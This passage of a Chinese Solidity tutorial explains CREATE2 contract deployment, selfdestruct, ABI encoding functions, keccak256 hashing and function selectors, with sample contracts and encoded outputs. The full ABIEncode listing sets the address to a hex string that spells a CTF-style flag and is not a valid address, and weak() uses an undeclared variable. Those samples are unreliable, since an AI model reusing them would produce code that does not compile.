&#125;</span><br><span class="line"></span><br><span class="line">    // called once by the factory at time of deployment</span><br><span class="line">    function initialize(address _token0, address _token1) external &#123;</span><br><span class="line">        require(msg.sender == factory, &#x27;UniswapV2: FORBIDDEN&#x27;); // sufficient check</span><br><span class="line">        token0 = _token0;</span><br><span class="line">        token1 = _token1;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>Pair</code>合约很简单，包含3个状态变量：<code>factory</code>，<code>token0</code>和<code>token1</code>。</p><p>构造函数<code>constructor</code>在部署时将<code>factory</code>赋值为工厂合约地址。<code>initialize</code>函数会在<code>Pair</code>合约创建的时候被工厂合约调用一次，将<code>token0</code>和<code>token1</code>更新为币对中两种代币的地址。</p><h4 id="PairFactory2"><a href="#PairFactory2" class="headerlink" title="PairFactory2"></a><code>PairFactory2</code></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">contract PairFactory2&#123;</span><br><span class="line">        mapping(address =&gt; mapping(address =&gt; address)) public getPair; // 通过两个代币地址查Pair地址</span><br><span class="line">        address[] public allPairs; // 保存所有Pair地址</span><br><span class="line"></span><br><span class="line">        function createPair2(address tokenA, address tokenB) external returns (address pairAddr) &#123;</span><br><span class="line">            require(tokenA != tokenB, &#x27;IDENTICAL_ADDRESSES&#x27;); //避免tokenA和tokenB相同产生的冲突</span><br><span class="line">            // 计算用tokenA和tokenB地址计算salt</span><br><span class="line">            (address token0, address token1) = tokenA &lt; tokenB ? (tokenA, tokenB) : (tokenB, tokenA); //将tokenA和tokenB按大小排序</span><br><span class="line">            bytes32 salt = keccak256(abi.encodePacked(token0, token1));</span><br><span class="line">            // 用create2部署新合约</span><br><span class="line">            Pair pair = new Pair&#123;salt: salt&#125;(); </span><br><span class="line">            // 调用新合约的initialize方法</span><br><span class="line">            pair.initialize(tokenA, tokenB);</span><br><span class="line">            // 更新地址map</span><br><span class="line">            pairAddr = address(pair);</span><br><span class="line">            allPairs.push(pairAddr);</span><br><span class="line">            getPair[tokenA][tokenB] = pairAddr;</span><br><span class="line">            getPair[tokenB][tokenA] = pairAddr;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>工厂合约（<code>PairFactory2</code>）有两个状态变量<code>getPair</code>是两个代币地址到币对地址的<code>map</code>，方便根据代币找到币对地址；<code>allPairs</code>是币对地址的数组，存储了所有币对地址。</p><p><code>PairFactory2</code>合约只有一个<code>createPair2</code>函数，使用<code>CREATE2</code>根据输入的两个代币地址<code>tokenA</code>和<code>tokenB</code>来创建新的<code>Pair</code>合约。其中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Pair pair = new Pair&#123;salt: salt&#125;(); </span><br></pre></td></tr></table></figure><p>就是利用<code>CREATE2</code>创建合约的代码，非常简单，而<code>salt</code>为<code>token1</code>和<code>token2</code>的<code>hash</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bytes32 salt = keccak256(abi.encodePacked(token0, token1));</span><br></pre></td></tr></table></figure><h4 id="事先计算Pair地址"><a href="#事先计算Pair地址" class="headerlink" title="事先计算Pair地址"></a>事先计算<code>Pair</code>地址</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">// 提前计算pair合约地址</span><br><span class="line">function calculateAddr(address tokenA, address tokenB) public view returns(address predictedAddress)&#123;</span><br><span class="line">    require(tokenA != tokenB, &#x27;IDENTICAL_ADDRESSES&#x27;); //避免tokenA和tokenB相同产生的冲突</span><br><span class="line">    // 计算用tokenA和tokenB地址计算salt</span><br><span class="line">    (address token0, address token1) = tokenA &lt; tokenB ? (tokenA, tokenB) : (tokenB, tokenA); //将tokenA和tokenB按大小排序</span><br><span class="line">    bytes32 salt = keccak256(abi.encodePacked(token0, token1));</span><br><span class="line">    // 计算合约地址方法 hash()</span><br><span class="line">    predictedAddress = address(uint160(uint(keccak256(abi.encodePacked(</span><br><span class="line">        bytes1(0xff),</span><br><span class="line">        address(this),</span><br><span class="line">        salt,</span><br><span class="line">        keccak256(type(Pair).creationCode)</span><br><span class="line">    )))));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们写了一个<code>calculateAddr</code>函数来事先计算<code>tokenA</code>和<code>tokenB</code>将会生成的<code>Pair</code>地址。通过它，我们可以验证我们事先计算的地址和实际地址是否相同。</p><p>大家可以部署好<code>PairFactory2</code>合约，然后用下面两个地址作为参数调用<code>createPair2</code>，看看创建的币对地址是什么，是否与事先计算的地址一样：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">WBNB地址: 0x2c44b726ADF1963cA47Af88B284C06f30380fC78</span><br><span class="line">BSC链上的PEOPLE地址:</span><br><span class="line">0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c</span><br></pre></td></tr></table></figure><h4 id="create2的实际应用场景"><a href="#create2的实际应用场景" class="headerlink" title="create2的实际应用场景"></a>create2的实际应用场景</h4><ol><li>交易所为新用户预留创建钱包合约地址。</li><li>由 <code>CREATE2</code> 驱动的 <code>factory</code> 合约，在<code>uniswapV2</code>中交易对的创建是在 <code>Factory</code>中调用<code>create2</code>完成。这样做的好处是: 它可以得到一个确定的<code>pair</code>地址, 使得 <code>Router</code>中就可以通过 <code>(tokenA, tokenB)</code> 计算出<code>pair</code>地址, 不再需要执行一次 <code>Factory.getPair(tokenA, tokenB)</code> 的跨合约调用。</li></ol><h2 id="删除合约"><a href="#删除合约" class="headerlink" title="删除合约"></a>删除合约</h2><h3 id="selfdestruct"><a href="#selfdestruct" class="headerlink" title="selfdestruct"></a><code>selfdestruct</code></h3><p><code>selfdestruct</code>命令可以用来删除智能合约，并将该合约剩余<code>ETH</code>转到指定地址。<code>selfdestruct</code>是为了应对合约出错的极端情况而设计的。它最早被命名为<code>suicide</code>（自杀），但是这个词太敏感。为了保护抑郁的程序员，改名为<code>selfdestruct</code>。</p><h3 id="如何使用selfdestruct"><a href="#如何使用selfdestruct" class="headerlink" title="如何使用selfdestruct"></a>如何使用<code>selfdestruct</code></h3><p><code>selfdestruct</code>使用起来非常简单：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">selfdestruct(_addr)；</span><br></pre></td></tr></table></figure><p>其中<code>_addr</code>是接收合约中剩余<code>ETH</code>的地址。</p><h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">contract DeleteContract &#123;</span><br><span class="line"></span><br><span class="line">    uint public value = 10;</span><br><span class="line"></span><br><span class="line">    constructor() payable &#123;&#125;</span><br><span class="line"></span><br><span class="line">    receive() external payable &#123;&#125;</span><br><span class="line"></span><br><span class="line">    function deleteContract() external &#123;</span><br><span class="line">        // 调用selfdestruct销毁合约，并把剩余的ETH转给msg.sender</span><br><span class="line">        selfdestruct(payable(msg.sender));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function getBalance() external view returns(uint balance)&#123;</span><br><span class="line">        balance = address(this).balance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在<code>DeleteContract</code>合约中，我们写了一个<code>public</code>状态变量<code>value</code>，两个函数：<code>getBalance()</code>用于获取合约<code>ETH</code>余额，<code>deleteContract()</code>用于自毁合约，并把<code>ETH</code>转入给发起人。</p><p>部署好合约后，我们向<code>DeleteContract</code>合约转入1 <code>ETH</code>。这时，<code>getBalance()</code>会返回1 <code>ETH</code>，<code>value</code>变量是10。</p><p>当我们调用<code>deleteContract()</code>函数，合约将自毁，所有变量都清空，此时<code>value</code>变为默认值<code>0</code>，<code>getBalance()</code>也返回空值。</p><h3 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h3><ol><li>对外提供合约销毁接口时，最好设置为只有合约所有者可以调用，可以使用函数修饰符<code>onlyOwner</code>进行函数声明。</li><li>当合约被销毁后与智能合约的交互也能成功，并且返回0。</li><li>当合约中有<code>selfdestruct</code>功能时常常会带来安全问题和信任问题，合约中的Selfdestruct功能会为攻击者打开攻击向量(例如使用<code>selfdestruct</code>向一个合约频繁转入token进行攻击，这将大大节省了GAS的费用，虽然很少人这么做)，此外，此功能还会降低用户对合约的信心。</li></ol><h2 id="ABI编码解码"><a href="#ABI编码解码" class="headerlink" title="ABI编码解码"></a>ABI编码解码</h2><p><code>ABI</code> (Application Binary Interface，应用二进制接口)是与以太坊智能合约交互的标准。数据基于他们的类型编码；并且由于编码后不包含类型信息，解码时需要注明它们的类型。</p><p><code>Solidity</code>中，<code>ABI编码</code>有4个函数：<code>abi.encode</code>, <code>abi.encodePacked</code>, <code>abi.encodeWithSignature</code>, <code>abi.encodeWithSelector</code>。而<code>ABI解码</code>有1个函数：<code>abi.decode</code>，用于解码<code>abi.encode</code>的数据。这一讲，我们将学习如何使用这些函数。</p><h3 id="ABI编码"><a href="#ABI编码" class="headerlink" title="ABI编码"></a>ABI编码</h3><p>我们将用编码4个变量，他们的类型分别是<code>uint256</code>, <code>address</code>, <code>string</code>, <code>uint256[2]</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">uint x = 10;</span><br><span class="line">address addr = 0x7A58c0Be72BE218B41C608b7Fe7C5bB630736C71;</span><br><span class="line">string name = &quot;0xAA&quot;;</span><br><span class="line">uint[2] array = [5, 6]; </span><br></pre></td></tr></table></figure><h4 id="abi-encode"><a href="#abi-encode" class="headerlink" title="abi.encode"></a><code>abi.encode</code></h4><p>将给定参数利用<a href="https://learnblockchain.cn/docs/solidity/abi-spec.html">ABI规则</a>编码。<code>ABI</code>被设计出来跟智能合约交互，他将每个参数填充为32字节的数据，并拼接在一起。如果你要和合约交互，你要用的就是<code>abi.encode</code>。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function encode() public view returns(bytes memory result) &#123;</span><br><span class="line">    result = abi.encode(x, addr, name, array);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编码的结果为<code>0x000000000000000000000000000000000000000000000000000000000000000a0000000000000000000000007a58c0be72be218b41c608b7fe7c5bb630736c7100000000000000000000000000000000000000000000000000000000000000a00000000000000000000000000000000000000000000000000000000000000005000000000000000000000000000000000000000000000000000000000000000600000000000000000000000000000000000000000000000000000000000000043078414100000000000000000000000000000000000000000000000000000000</code>，由于<code>abi.encode</code>将每个数据都填充为32字节，中间有很多<code>0</code>。</p><h4 id="abi-encodePacked"><a href="#abi-encodePacked" class="headerlink" title="abi.encodePacked"></a><code>abi.encodePacked</code></h4><p>将给定参数根据其所需最低空间编码。它类似 <code>abi.encode</code>，但是会把其中填充的很多<code>0</code>省略。比如，只用1字节来编码<code>uint</code>类型。当你想省空间，并且不与合约交互的时候，可以使用<code>abi.encodePacked</code>，例如算一些数据的<code>hash</code>时。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function encodePacked() public view returns(bytes memory result) &#123;</span><br><span class="line">    result = abi.encodePacked(x, addr, name, array);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编码的结果为<code>0x000000000000000000000000000000000000000000000000000000000000000a7a58c0be72be218b41c608b7fe7c5bb630736c713078414100000000000000000000000000000000000000000000000000000000000000050000000000000000000000000000000000000000000000000000000000000006</code>，由于<code>abi.encodePacked</code>对编码进行了压缩，长度比<code>abi.encode</code>短很多。</p><h4 id="abi-encodeWithSignature"><a href="#abi-encodeWithSignature" class="headerlink" title="abi.encodeWithSignature"></a><code>abi.encodeWithSignature</code></h4><p>与<code>abi.encode</code>功能类似，只不过第一个参数为<code>函数签名</code>，比如<code>&quot;foo(uint256,address)&quot;</code>。当调用其他合约的时候可以使用。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function encodeWithSignature() public view returns(bytes memory result) &#123;</span><br><span class="line">    result = abi.encodeWithSignature(&quot;foo(uint256,address,string,uint256[2])&quot;, x, addr, name, array);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编码的结果为<code>0xe87082f1000000000000000000000000000000000000000000000000000000000000000a0000000000000000000000007a58c0be72be218b41c608b7fe7c5bb630736c7100000000000000000000000000000000000000000000000000000000000000a00000000000000000000000000000000000000000000000000000000000000005000000000000000000000000000000000000000000000000000000000000000600000000000000000000000000000000000000000000000000000000000000043078414100000000000000000000000000000000000000000000000000000000</code>，等同于在<code>abi.encode</code>编码结果前加上了4字节的<code>函数选择器</code><a href="https://wtf.academy/solidity-advanced/ABIEncode/#fn-%E8%AF%B4%E6%98%8E">说明</a>。 <a href="https://wtf.academy/solidity-advanced/ABIEncode/#fn-%E8%AF%B4%E6%98%8E">说明</a>: 函数选择器就是通过函数名和参数进行签名处理(Keccak–Sha3)来标识函数，可以用于不同合约之间的函数调用</p><h4 id="abi-encodeWithSelector"><a href="#abi-encodeWithSelector" class="headerlink" title="abi.encodeWithSelector"></a><code>abi.encodeWithSelector</code></h4><p>与<code>abi.encodeWithSignature</code>功能类似，只不过第一个参数为<code>函数选择器</code>，为<code>函数签名</code>Keccak哈希的前4个字节。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function encodeWithSelector() public view returns(bytes memory result) &#123;</span><br><span class="line">    result = abi.encodeWithSelector(bytes4(keccak256(&quot;foo(uint256,address,string,uint256[2])&quot;)), x, addr, name, array);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编码的结果为<code>0xe87082f1000000000000000000000000000000000000000000000000000000000000000a0000000000000000000000007a58c0be72be218b41c608b7fe7c5bb630736c7100000000000000000000000000000000000000000000000000000000000000a00000000000000000000000000000000000000000000000000000000000000005000000000000000000000000000000000000000000000000000000000000000600000000000000000000000000000000000000000000000000000000000000043078414100000000000000000000000000000000000000000000000000000000</code>，与<code>abi.encodeWithSignature</code>结果一样。</p><h3 id="ABI解码"><a href="#ABI解码" class="headerlink" title="ABI解码"></a>ABI解码</h3><h4 id="abi-decode"><a href="#abi-decode" class="headerlink" title="abi.decode"></a><code>abi.decode</code></h4><p><code>abi.decode</code>用于解码<code>abi.encode</code>生成的二进制编码，将它还原成原本的参数。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function decode(bytes memory data) public pure returns(uint dx, address daddr, string memory dname, uint[2] memory darray) &#123;</span><br><span class="line">    (dx, daddr, dname, darray) = abi.decode(data, (uint, address, string, uint[2]));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们将<code>abi.encode</code>的二进制编码输入给<code>decode</code>，将解码出原来的参数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.4;</span><br><span class="line"></span><br><span class="line">contract ABIEncode&#123;</span><br><span class="line">    uint x = 10;</span><br><span class="line">    //address addr = 0x7A58c0Be72BE218B41C608b7Fe7C5bB630736C71;</span><br><span class="line">    address addr= 0x666c61677b7465736869666c61677d;</span><br><span class="line">    string name = &quot;0xAA&quot;;</span><br><span class="line">    uint[2] array = [5, 6]; </span><br><span class="line"></span><br><span class="line">    function encode() public view returns(bytes memory result) &#123;</span><br><span class="line">        result = abi.encode(x, addr, name, array);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function encodePacked() public view returns(bytes memory result) &#123;</span><br><span class="line">        result = abi.encodePacked(x, addr, name, array);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function encodeWithSignature() public view returns(bytes memory result) &#123;</span><br><span class="line">        result = abi.encodeWithSignature(&quot;foo(uint256,address,string,uint256[2])&quot;, x, addr, name, array);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function encodeWithSelector() public view returns(bytes memory result) &#123;</span><br><span class="line">        result = abi.encodeWithSelector(bytes4(keccak256(&quot;foo(uint256,address,string,uint256[2])&quot;)), x, addr, name, array);</span><br><span class="line">    &#125;</span><br><span class="line">    function decode(bytes memory data) public pure returns(uint dx, address daddr, string memory dname, uint[2] memory darray) &#123;</span><br><span class="line">        (dx, daddr, dname, darray) = abi.decode(data, (uint, address, string, uint[2]));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="ABI的使用场景"><a href="#ABI的使用场景" class="headerlink" title="ABI的使用场景"></a>ABI的使用场景</h3><ul><li>在合约开发中，ABI常配合call来实现对合约的底层调用。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">bytes4 selector = contract.getValue.selector;</span><br><span class="line"></span><br><span class="line">bytes memory data = abi.encodeWithSelector(selector, _x);</span><br><span class="line">(bool success, bytes memory returnedData) = address(contract).staticcall(data);</span><br><span class="line">require(success);</span><br><span class="line"></span><br><span class="line">return abi.decode(returnedData, (uint256));</span><br></pre></td></tr></table></figure><ul><li>ethers.js中常用ABI实现合约的导入和函数调用。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">const wavePortalContract = new ethers.Contract(contractAddress, contractABI, signer);</span><br><span class="line">//* Call the getAllWaves method from your Smart Contract */</span><br><span class="line">const waves = await wavePortalContract.getAllWaves();</span><br></pre></td></tr></table></figure><ul><li>对不开源合约进行反编译后，某些函数无法查到函数签名，可通过ABI进行调用。<ul><li>0x533ba33a() 是一个反编译后显示的函数，只有函数编码后的结果，并且无法查到函数签名</li><li>这种情况无法通过构造interface接口或contract来进行调用</li><li>这种情况下，就可以通过ABI函数选择器来调用</li></ul></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">bytes memory data = abi.encodeWithSelector(bytes4(0x533ba33a));</span><br><span class="line"></span><br><span class="line">(bool success, bytes memory returnedData) = address(contract).staticcall(data);</span><br><span class="line">require(success);</span><br><span class="line"></span><br><span class="line">return abi.decode(returnedData, (uint256));</span><br></pre></td></tr></table></figure><h2 id="Hash"><a href="#Hash" class="headerlink" title="Hash"></a>Hash</h2><p>哈希函数（hash function）是一个密码学概念，它可以将任意长度的消息转换为一个固定长度的值，这个值也称作哈希（hash）。这一讲，我们简单介绍一下哈希函数及在<code>solidity</code>的应用</p><h3 id="Hash的性质"><a href="#Hash的性质" class="headerlink" title="Hash的性质"></a>Hash的性质</h3><p>一个好的哈希函数应该具有以下几个特性：</p><ul><li>单向性：从输入的消息到它的哈希的正向运算简单且唯一确定，而反过来非常难，只能靠暴力枚举。</li><li>灵敏性：输入的消息改变一点对它的哈希改变很大。</li><li>高效性：从输入的消息到哈希的运算高效。</li><li>均一性：每个哈希值被取到的概率应该基本相等。</li><li>抗碰撞性：<ul><li>弱抗碰撞性：给定一个消息<code>x</code>，找到另一个消息<code>x&#39;</code>使得<code>hash(x) = hash(x&#39;)</code>是困难的。</li><li>强抗碰撞性：找到任意<code>x</code>和<code>x&#39;</code>，使得<code>hash(x) = hash(x&#39;)</code>是困难的。</li></ul></li></ul><h3 id="Hash的应用"><a href="#Hash的应用" class="headerlink" title="Hash的应用"></a>Hash的应用</h3><ul><li>生成数据唯一标识</li><li>加密签名</li><li>安全加密</li></ul><h3 id="Keccak256"><a href="#Keccak256" class="headerlink" title="Keccak256"></a>Keccak256</h3><p><code>Keccak256</code>函数是<code>solidity</code>中最常用的哈希函数，用法非常简单：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">哈希 = keccak256(数据);</span><br></pre></td></tr></table></figure><h4 id="Keccak256和sha3"><a href="#Keccak256和sha3" class="headerlink" title="Keccak256和sha3"></a>Keccak256和sha3</h4><p>这是一个很有趣的事情：</p><ol><li>sha3由keccak标准化而来，在很多场合下Keccak和SHA3是同义词，但在2015年8月SHA3最终完成标准化时，NIST调整了填充算法。<strong>所以SHA3就和keccak计算的结果不一样</strong>，这点在实际开发中要注意。</li><li>以太坊在开发的时候sha3还在标准化中，所以采用了keccak，所以Ethereum和Solidity智能合约代码中的SHA3是指Keccak256，而不是标准的NIST-SHA3，为了避免混淆，直接在合约代码中写成Keccak256是最清晰的。</li></ol><h4 id="生成数据唯一标识"><a href="#生成数据唯一标识" class="headerlink" title="生成数据唯一标识"></a>生成数据唯一标识</h4><p>我们可以利用<code>keccak256</code>来生成一些数据的唯一标识。比如我们有几个不同类型的数据：<code>uint</code>，<code>string</code>，<code>address</code>，我们可以先用<code>abi.encodePacked</code>方法将他们打包编码，然后再用<code>keccak256</code>来生成唯一标识：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">function hash(</span><br><span class="line">    uint _num,</span><br><span class="line">    string memory _string,</span><br><span class="line">    address _addr</span><br><span class="line">) public pure returns (bytes32) &#123;</span><br><span class="line">    return keccak256(abi.encodePacked(_num, _string, _addr));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="弱抗碰撞性"><a href="#弱抗碰撞性" class="headerlink" title="弱抗碰撞性"></a>弱抗碰撞性</h4><p>我们用<code>keccak256</code>演示一下之前讲到的弱抗碰撞性，即给定一个消息<code>x</code>，找到另一个消息<code>x&#39;</code>使得<code>hash(x) = hash(x&#39;)</code>是困难的。</p><p>我们给定一个消息<code>0xAA</code>，试图去找另一个消息，使得它们的哈希值相等：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">// 弱抗碰撞性</span><br><span class="line">function weak(</span><br><span class="line">    string memory string1</span><br><span class="line">)public view returns (bool)&#123;</span><br><span class="line">    return keccak256(abi.encodePacked(string1)) == _msg;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="强抗碰撞性"><a href="#强抗碰撞性" class="headerlink" title="强抗碰撞性"></a>强抗碰撞性</h4><p>我们用<code>keccak256</code>演示一下之前讲到的强抗碰撞性，即找到任意不同的<code>x</code>和<code>x&#39;</code>，使得<code>hash(x) = hash(x&#39;)</code>是困难的。</p><p>我们构造一个函数<code>strong</code>，接收两个不同的<code>string</code>参数<code>string1</code>和<code>string2</code>，然后判断它们的哈希是否相同：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">// 强抗碰撞性</span><br><span class="line">function strong(</span><br><span class="line">    string memory string1,</span><br><span class="line">    string memory string2</span><br><span class="line">)public pure returns (bool)&#123;</span><br><span class="line">    return keccak256(abi.encodePacked(string1)) == keccak256(abi.encodePacked(string2));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="函数选择器Selector"><a href="#函数选择器Selector" class="headerlink" title="函数选择器Selector"></a>函数选择器Selector</h2><p>当我们调用智能合约时，本质上是向目标合约发送了一段<code>calldata</code>，在remix中发送一次交易后，可以在详细信息中看见<code>input</code>即为此次交易的<code>calldata</code>发送的<code>calldata</code>中前4个字节是<code>selector</code>（函数选择器）。</p><h3 id="msg-data"><a href="#msg-data" class="headerlink" title="msg.data[]"></a><code>msg.data</code>[]</h3><p><code>msg.data</code>是<code>solidity</code>中的一个全局变量，值为完整的<code>calldata</code>（调用函数时传入的数据）。</p><p>在下面的代码中，我们可以通过<code>Log</code>事件来输出调用<code>mint</code>函数的<code>calldata</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">// event 返回msg.data</span><br><span class="line">event Log(bytes data);</span><br><span class="line"></span><br><span class="line">function mint(address to) external&#123;</span><br><span class="line">    emit Log(msg.data);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当参数为<code>0x2c44b726ADF1963cA47Af88B284C06f30380fC78</code>时，输出的<code>calldata</code>为</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x6a6278420000000000000000000000002c44b726adf1963ca47af88b284c06f30380fc78</span><br></pre></td></tr></table></figure><p>这段很乱的字节码可以分成两部分：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">前4个字节为函数选择器selector：</span><br><span class="line">0x6a627842</span><br><span class="line"></span><br><span class="line">后面32个字节为输入的参数：</span><br><span class="line">0x0000000000000000000000002c44b726adf1963ca47af88b284c06f30380fc78</span><br></pre></td></tr></table></figure><p>其实<code>calldata</code>就是告诉智能合约，我要调用哪个函数，以及参数是什么。</p><h3 id="method-id、selector和函数签名"><a href="#method-id、selector和函数签名" class="headerlink" title="method id、selector和函数签名"></a><code>method id</code>、<code>selector</code>和<code>函数签名</code></h3><p><code>method id</code>定义为<code>函数签名</code>的<code>Keccak</code>哈希后的前4个字节，当<code>selector</code>与<code>method id</code>相匹配时，即表示调用该函数，那么<code>函数签名</code>是什么？</p><p>函数签名：为<code>&quot;函数名（逗号分隔的参数类型)&quot;</code>。举个例子，上面代码中<code>mint</code>的函数签名为<code>&quot;mint(address)&quot;</code>。在同一个智能合约中，不同的函数有不同的函数签名，因此我们可以通过函数签名来确定要调用哪个函数。</p><p><strong>注意</strong>，在函数签名中，<code>uint</code>和<code>int</code>要写为<code>uint256</code>和<code>int256</code>。</p><p>我们写一个函数，来验证<code>mint</code>函数的<code>method id</code>是否为<code>0x6a627842</code>。大家可以运行下面的函数，看看结果。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function mintSelector() external pure returns(bytes4 mSelector)&#123;</span><br><span class="line">    return bytes4(keccak256(&quot;mint(address)&quot;));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>结果正是<code>0x6a627842</code>：</p><h3 id="使用selector"><a href="#使用selector" class="headerlink" title="使用selector"></a>使用<code>selector</code></h3><p>我们可以利用<code>selector</code>来调用目标函数。例如我想调用<code>mint</code>函数，我只需要利用<code>abi.encodeWithSelector</code>将<code>mint</code>函数的<code>method id</code>作为<code>selector</code>和参数打包编码，传给<code>call</code>函数：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td 